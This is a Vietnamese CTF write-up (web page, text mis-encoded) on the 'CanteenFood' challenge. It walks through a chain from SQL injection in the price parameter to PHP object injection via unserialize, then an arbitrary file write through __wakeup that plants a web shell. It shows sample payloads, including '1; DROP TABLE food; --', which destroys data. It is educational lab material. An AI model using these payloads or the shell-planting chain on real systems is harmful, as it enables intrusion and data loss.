<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CanteenFood CTF Challenge WriteUp | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="CanteenFood CTF Challenge WriteUp by @PhatmhTiáº¿n hÃ nh phÃ¢n tÃ­ch chá»©c nÄƒng theo kiá»ƒu BlackBox ÄÃ¢y lÃ  má»™t trang Web cÃ³ chá»©c nÄƒng cho User tÃ¬m kiáº¿m Ä‘Æ°á»£c mÃ³n Äƒn phÃ¹ há»£p vá»›i tÃºi tiá»n cá»§a mÃ¬nh nháº¥t báº±ng cÃ¡c">
<meta property="og:type" content="article">
<meta property="og:title" content="CanteenFood CTF Challenge WriteUp">
<meta property="og:url" content="https://pzhat.github.io/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/index.html">
<meta property="og:site_name" content="Phat Mai Blog">
<meta property="og:description" content="CanteenFood CTF Challenge WriteUp by @PhatmhTiáº¿n hÃ nh phÃ¢n tÃ­ch chá»©c nÄƒng theo kiá»ƒu BlackBox ÄÃ¢y lÃ  má»™t trang Web cÃ³ chá»©c nÄƒng cho User tÃ¬m kiáº¿m Ä‘Æ°á»£c mÃ³n Äƒn phÃ¹ há»£p vá»›i tÃºi tiá»n cá»§a mÃ¬nh nháº¥t báº±ng cÃ¡c">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pzhat.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2025-11-14T19:34:38.204Z">
<meta property="article:modified_time" content="2025-10-24T05:38:35.000Z">
<meta property="article:author" content="Phat Mai">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pzhat.github.io/img/avatar.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CanteenFood CTF Challenge WriteUp",
  "url": "https://pzhat.github.io/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/",
  "image": "https://pzhat.github.io/img/avatar.jpg",
  "datePublished": "2025-11-14T19:34:38.204Z",
  "dateModified": "2025-10-24T05:38:35.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Phat Mai",
      "url": "https://pzhat.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CanteenFood CTF Challenge WriteUp',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/mobile-cover-fix.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/background2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">CanteenFood CTF Challenge WriteUp</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CanteenFood CTF Challenge WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-14T19:34:38.204Z" title="Created 2025-11-15 02:34:38">2025-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-24T05:38:35.000Z" title="Updated 2025-10-24 12:38:35">2025-10-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="CanteenFood-CTF-Challenge-WriteUp-by-Phatmh"><a href="#CanteenFood-CTF-Challenge-WriteUp-by-Phatmh" class="headerlink" title="CanteenFood CTF Challenge WriteUp by @Phatmh"></a>CanteenFood CTF Challenge WriteUp by @Phatmh</h1><h2 id="Tien-hanh-phan-tich-chuc-nang-theo-kieu-BlackBox"><a href="#Tien-hanh-phan-tich-chuc-nang-theo-kieu-BlackBox" class="headerlink" title="Tiáº¿n hÃ nh phÃ¢n tÃ­ch chá»©c nÄƒng theo kiá»ƒu BlackBox"></a>Tiáº¿n hÃ nh phÃ¢n tÃ­ch chá»©c nÄƒng theo kiá»ƒu BlackBox</h2><p><img src="https://hackmd.io/_uploads/SJOQlrxHxx.png" alt="image"></p>
<p>ÄÃ¢y lÃ  má»™t trang Web cÃ³ chá»©c nÄƒng cho User tÃ¬m kiáº¿m Ä‘Æ°á»£c mÃ³n Äƒn phÃ¹ há»£p vá»›i tÃºi tiá»n cá»§a mÃ¬nh nháº¥t báº±ng cÃ¡ch nháº­p sá»‘ tiá»n mÃ¬nh mong muá»‘n nÃ³ sáº½ tráº£ vá» mÃ³n mÃ  mÃ¬nh Ä‘á»§ tiá»n tráº£.</p>
<p><img src="https://hackmd.io/_uploads/rJesxBgBxx.png" alt="image"></p>
<p>á» Ä‘Ã¢y sau khi viáº¿t ra sá»‘ 300 vÃ  tiáº¿n hÃ nh báº¥m chá»©c nÄƒng thÃ¬ nÃ³ tráº£ vá» Ä‘Æ°á»£c list cÃ¡c mÃ³n dÆ°á»›i 300.</p>
<p><img src="https://hackmd.io/_uploads/Hyhgbrgrle.png" alt="image"></p>
<p>á» ngay bÃªn trÃªn mÃ¬nh phÃ¡t hiá»‡n Ä‘Æ°á»£c má»™t nÆ¡i Ä‘Ã¡ng ngá» lÃ  chá»¯ admin cÃ³ thá»ƒ dáº«n ta Ä‘i Ä‘Ã¢u Ä‘Ã³ vÃ¬ thá»ƒ click thá»­ vÃ o.</p>
<p><img src="https://hackmd.io/_uploads/HJ7E-Hlrxg.png" alt="image"></p>
<p>NÃ³ tráº£ vá» cho ta dÃ²ng <strong>Only access allowed for canteen admin!!!</strong> cÃ³ váº» nÆ¡i Ä‘Ã¢y Ä‘Ã£ bá»‹ block láº¡i vÃ  chá»‰ cho phÃ©p admin truy cáº­p vÃ o.</p>
<p><img src="https://hackmd.io/_uploads/SkPtWBgHle.png" alt="image"></p>
<p>Sau má»™t lÃºc phÃ¢n tÃ­ch thÃ¬ mÃ¬nh tháº¥y Ä‘Æ°á»ng dáº«n nÃ y liá»‡u cÃ³ thá»ƒ lÃ  nÆ¡i Ä‘á»ƒ mÃ¬nh cÃ³ thá»ƒ táº¥n cÃ´ng báº±ng cÃ¡ch nÃ o Ä‘Ã³ khÃ´ng vÃ¬ parameter <strong>?price&#x3D;</strong> cho phÃ©p ngÆ°á»i dÃ¹ng thay Ä‘á»•i vÃ  Ä‘Ã³ lÃ  má»™t <strong>Untrusted Data</strong> hoÃ n toÃ n cÃ³ thá»ƒ táº¥n cÃ´ng vÃ o.</p>
<h2 id="Tien-hanh-phan-tich-Source-Code-cho-san"><a href="#Tien-hanh-phan-tich-Source-Code-cho-san" class="headerlink" title="Tiáº¿n hÃ nh phÃ¢n tÃ­ch Source Code cho sáºµn"></a>Tiáº¿n hÃ nh phÃ¢n tÃ­ch Source Code cho sáºµn</h2><p><strong>AdminController.php</strong>:</p>
<p><img src="https://hackmd.io/_uploads/SJwYPBlrll.png" alt="image"></p>
<p>ÄÃ¢y lÃ  hÃ m xá»­ lÃ½ quyá»n truy cáº­p cá»§a ngÆ°á»i dÃ¹ng, nÃ³ sáº½ dÃ¹ng method admin Ä‘á»ƒ xá»­ lÃ½ trang. Sá»­ dá»¥ng If Else Ä‘á»ƒ kiá»ƒm tra Session ngÆ°á»i dÃ¹ng, nÃ³ sáº½ tá»« chá»‘i truy cáº­p khi <strong>$_SESSION[â€œadminâ€] &#x3D;&#x3D;&#x3D; false (strict)</strong> vÃ  tráº£ vá» thÃ´ng bÃ¡o ráº±ng <strong>Only access allowed for canteen admin!!!</strong>. CÃ²n náº¿u ngÆ°á»i dÃ¹ng lÃ  Admin thÃ¬ nÃ³ sáº½ trá» Ä‘áº¿n AdminModel Ä‘á»ƒ Ä‘á»c file <strong>&#x2F;logs.txt</strong> vÃ  tráº£ vá» ná»™i dung. á» Ä‘Ã¢y khÃ´ng cÃ³ má»™t Sink nÃ o Ä‘á»ƒ ta cÃ³ thá»ƒ lá»£i dá»¥ng táº¥n cÃ´ng vÃ o mÃ  chá»‰ cung cáº¥p cho ta thÃ´ng tin vá» cÃ¡ch trang web control Ä‘Æ°á»£c admin.</p>
<p><strong>CanteenController.php</strong>:</p>
<p><img src="https://hackmd.io/_uploads/BJ1VI--rxx.png" alt="image"></p>
<p>CanteenController vá»›i chá»©c nÄƒng chÃ­nh lÃ  hiá»ƒn thá»‹ thá»±c Ä‘Æ¡n canteen, táº¡o canteen Model vÃ  xá»­ lÃ½ fillter theo giÃ¡ sáº£n pháº©m.</p>
<p><strong>AdminModel.php</strong>:</p>
<p><img src="https://hackmd.io/_uploads/Syr7-4Wrxx.png" alt="image"></p>
<p>NÆ¡i Ä‘Ã¢y chá»©a hÃ m kiá»ƒm tra Session Ä‘á»ƒ cÃ³ thá»ƒ truy cáº­p vÃ o AdminModel trong trÆ°á»ng há»£p ngÆ°á»i truy cáº­p lÃ  admin, cÃ¹ng vá»›i Ä‘Ã³ lÃ  cÃ¡c constructor Ä‘á»ƒ ghi file vÃ o file logs. á» Ä‘Ã¢y mÃ¬nh Ä‘á»ƒ Ã½ má»™t <strong>magic method</strong> lÃ  <strong>__wakeup</strong> lÃ  má»™t method Ä‘Æ°á»£c gá»i khi object Ä‘Æ°á»£c unserialize. Váº­y ta cÃ³ thá»ƒ lá»£i dá»¥ng method nÃ y Ä‘á»ƒ tiáº¿n hÃ nh ká»‹ch báº£n <strong>PHP Object Injection to RCE</strong> Ä‘Æ°á»£c khÃ´ng? Ta sáº½ lÆ°u Ã½ Ä‘oáº¡n nÃ y vÃ  tiáº¿n hÃ nh Ä‘á»c code tiáº¿p.<br><strong>CanteenModel.php</strong>:<br>á» Ä‘Ã¢y lÃ  má»™t class chá»©a 2 functions chÃ­nh lÃ  <strong>getFood()</strong> vÃ  <strong>filterFood()</strong> </p>
<p><img src="https://hackmd.io/_uploads/ryhm7EbBex.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B1fHmNWSel.png" alt="image"></p>
<p>Táº¡i Ä‘Ã¢y mÃ¬nh Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c Sink Ä‘á»ƒ cÃ³ thá»ƒ khai thÃ¡c Ä‘Æ°á»£c cá»¥ thá»ƒ á»Ÿ Ä‘Ã¢y lÃ  má»™t chuá»—i exploit chain lá»£i dá»¥ng Sqli vÃ  PHP Object Injection báº±ng magic method tá»« Ä‘Ã³ RCE </p>
<h1 id="Giai-thich-chi-tiet-chuoi-exploit-CTF"><a href="#Giai-thich-chi-tiet-chuoi-exploit-CTF" class="headerlink" title="Giáº£i thÃ­ch chi tiáº¿t chuá»—i exploit CTF"></a>Giáº£i thÃ­ch chi tiáº¿t chuá»—i exploit CTF</h1><h2 id="ğŸ“‹-Tong-quan-kien-truc-ung-dung"><a href="#ğŸ“‹-Tong-quan-kien-truc-ung-dung" class="headerlink" title="ğŸ“‹ Tá»•ng quan kiáº¿n trÃºc á»©ng dá»¥ng"></a>ğŸ“‹ Tá»•ng quan kiáº¿n trÃºc á»©ng dá»¥ng</h2><h3 id="Cac-thanh-phan-chinh"><a href="#Cac-thanh-phan-chinh" class="headerlink" title="CÃ¡c thÃ nh pháº§n chÃ­nh:"></a>CÃ¡c thÃ nh pháº§n chÃ­nh:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CanteenController </span><br><span class="line">â”œâ”€â”€ index() â†’ getFood() hoáº·c filterFood()</span><br><span class="line">â”œâ”€â”€ AdminController </span><br><span class="line">â”‚   â””â”€â”€ admin() â†’ AdminModel::read_logs()</span><br><span class="line">â””â”€â”€ AdminModel + LogFile classes</span><br></pre></td></tr></table></figure>

<h3 id="Luong-du-lieu"><a href="#Luong-du-lieu" class="headerlink" title="Luá»“ng dá»¯ liá»‡u:"></a>Luá»“ng dá»¯ liá»‡u:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User Request â†’ Controller â†’ Model â†’ Database â†’ Response</span><br></pre></td></tr></table></figure>

<h2 id="Phan-tich-tung-lo-hong"><a href="#Phan-tich-tung-lo-hong" class="headerlink" title="PhÃ¢n tÃ­ch tá»«ng lá»— há»•ng"></a>PhÃ¢n tÃ­ch tá»«ng lá»— há»•ng</h2><h3 id="1-SQL-Injection-filterFood"><a href="#1-SQL-Injection-filterFood" class="headerlink" title="1. SQL Injection (filterFood)"></a>1. <strong>SQL Injection (filterFood)</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM food where price &lt; &quot;</span> . <span class="variable">$price_param</span>;</span><br></pre></td></tr></table></figure>

<p><strong>Váº¥n Ä‘á»:</strong> <code>$price_param</code> Ä‘Æ°á»£c ná»‘i trá»±c tiáº¿p vÃ o query</p>
<ul>
<li>KhÃ´ng cÃ³ escaping, validation, prepared statement</li>
<li>Attacker cÃ³ thá»ƒ inject SQL commands</li>
</ul>
<p><strong>VÃ­ dá»¥:</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Request: /?price=1 OR 1=1</span></span><br><span class="line"><span class="variable">$price_param</span> = <span class="string">&quot;1 OR 1=1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM food where price &lt; 1 OR 1=1&quot;</span>;  <span class="comment">// Láº¥y táº¥t cáº£ records</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Request: /?price=1; DROP TABLE food; --</span></span><br><span class="line"><span class="variable">$price_param</span> = <span class="string">&quot;1; DROP TABLE food; --&quot;</span>;  </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM food where price &lt; 1; DROP TABLE food; --&quot;</span>;  <span class="comment">// XÃ³a table</span></span><br></pre></td></tr></table></figure>

<h3 id="2-PHP-Object-Injection-getFood-filterFood"><a href="#2-PHP-Object-Injection-getFood-filterFood" class="headerlink" title="2. PHP Object Injection (getFood &amp; filterFood)"></a>2. <strong>PHP Object Injection (getFood &amp; filterFood)</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$obj</span>-&gt;oldvalue !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$dec_result</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$obj</span>-&gt;oldvalue);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/O:\d+:&quot;([^&quot;]*)&quot;/&#x27;</span>, <span class="variable">$dec_result</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Not allowed&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$uns_result</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$dec_result</span>);  <span class="comment">// â† NGUY HIá»‚M!</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Váº¥n Ä‘á»:</strong> Unserialize dá»¯ liá»‡u tá»« database mÃ  chá»‰ cÃ³ filter yáº¿u</p>
<ul>
<li><code>unserialize()</code> cÃ³ thá»ƒ táº¡o object báº¥t ká»³</li>
<li>Filter chá»‰ check regex pattern <code>O:\d+:&quot;classname&quot;</code></li>
<li>CÃ³ thá»ƒ bypass filter</li>
</ul>
<p><strong>Táº¡i sao nguy hiá»ƒm:</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Khi unserialize, PHP sáº½:</span></span><br><span class="line"><span class="number">1</span>. Táº¡o <span class="keyword">object</span> theo <span class="class"><span class="keyword">class</span> Ä‘Æ°á»£<span class="title">c</span> <span class="title">ch</span>á»‰ Ä‘á»‹<span class="title">nh</span></span></span><br><span class="line"><span class="class">2. <span class="title">Set</span> <span class="title">c</span>Ã¡<span class="title">c</span> <span class="title">properties</span></span></span><br><span class="line"><span class="class">3. <span class="title">G</span>á»<span class="title">i</span> <span class="title">magic</span> <span class="title">method</span> <span class="title">__wakeup</span>() <span class="title">n</span>áº¿<span class="title">u</span> <span class="title">c</span>Ã³</span></span><br></pre></td></tr></table></figure>

<h3 id="3-Arbitrary-File-Write-wakeup-magic-method"><a href="#3-Arbitrary-File-Write-wakeup-magic-method" class="headerlink" title="3. Arbitrary File Write (__wakeup magic method)"></a>3. <strong>Arbitrary File Write (__wakeup magic method)</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminModel</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">LogFile</span>(<span class="variable language_">$this</span>-&gt;filename, <span class="variable language_">$this</span>-&gt;logcontent);  <span class="comment">// â† Magic method!</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>, FILE_APPEND);  <span class="comment">// â† Ghi file!</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Váº¥n Ä‘á»:</strong> Magic method <code>__wakeup()</code> Ä‘Æ°á»£c gá»i tá»± Ä‘á»™ng khi unserialize</p>
<ul>
<li>Táº¡o LogFile object â†’ ghi file vá»›i path vÃ  content tÃ¹y Ã½</li>
<li>KhÃ´ng validate filename&#x2F;content</li>
</ul>
<h2 id="Chuoi-exploit-chi-tiet"><a href="#Chuoi-exploit-chi-tiet" class="headerlink" title="Chuá»—i exploit chi tiáº¿t"></a>Chuá»—i exploit chi tiáº¿t</h2><p>Váº­y Ä‘Ã¢y ta cÃ³ thá»ƒ Ä‘Æ°a ra suy nghÄ© ráº±ng khi báº¯t Ä‘áº§u khá»Ÿi táº¡o Object vÃ  khi nÃ³ gá»i Ä‘áº¿n unserialize() thÃ¬ magic method Ä‘áº§u tiÃªn nÃ³ Ä‘i qua sáº½ lÃ  __wakeup() vÃ  cá»© má»—i láº§n nÃ³ sáº½ khá»Ÿi táº¡o value má»›i báº±ng file_put_contents váº­y nÃªn á»Ÿ Ä‘Ã¢y ká»‹ch báº£n sáº½ lÃ  ta sáº½ lá»£i dá»¥ng Sqli Ä‘á»ƒ ghi vÃ o chuá»—i serialize khi mÃ  hÃ m unserialize gá»i Ä‘áº¿n __wakeup thÃ¬ nÃ³ sáº½ thá»±c hiá»‡n vÃ  chuá»—i shell Ä‘Æ°á»£c file_put_contents Ä‘Æ°a vÃ o. BÃªn cáº¡nh Ä‘Ã³ tuy unserialize Ä‘Æ°á»£c filter báº±ng regex nhÆ°ng hoÃ n toÃ n cÃ³ thá»ƒ bypass nhÆ° Ä‘Ã£ nÃ³i á»Ÿ trÃªn.</p>
<p><img src="https://hackmd.io/_uploads/rkMKOrMSxe.png" alt="image"></p>
<p>Tiáº¿n hÃ nh viáº¿t Exploit code á»Ÿ Ä‘Ã¢y lá»£i dá»¥ng class AdminModel Ä‘á»ƒ lÃ m ra má»™t gadget chain khi mÃ  nÃ³ unserialize thÃ¬ nÃ³ sáº½ gá»i Ä‘áº¿n magic method lÃ  __wakeup, nÃªn trong quÃ¡ trÃ¬nh nÃ y mÃ¬nh dÃ¹ng serialize object rá»“i mÃ¬nh sáº½ Ä‘Æ°a nÃ³ vá» Base64.</p>
<p><img src="https://hackmd.io/_uploads/B1nzFSzSee.png" alt="image"></p>
<p>á» Ä‘Ã¢y mÃ¬nh sáº½ truyá»n shell tháº³ng vÃ o &#x2F;www&#x2F;shell.php vÃ¬ nÆ¡i chá»©a index cá»§a bÃ i sáº½ náº±m á»Ÿ root cá»§a docker.</p>
<p><img src="https://hackmd.io/_uploads/r1upFHzSgx.png" alt="image"></p>
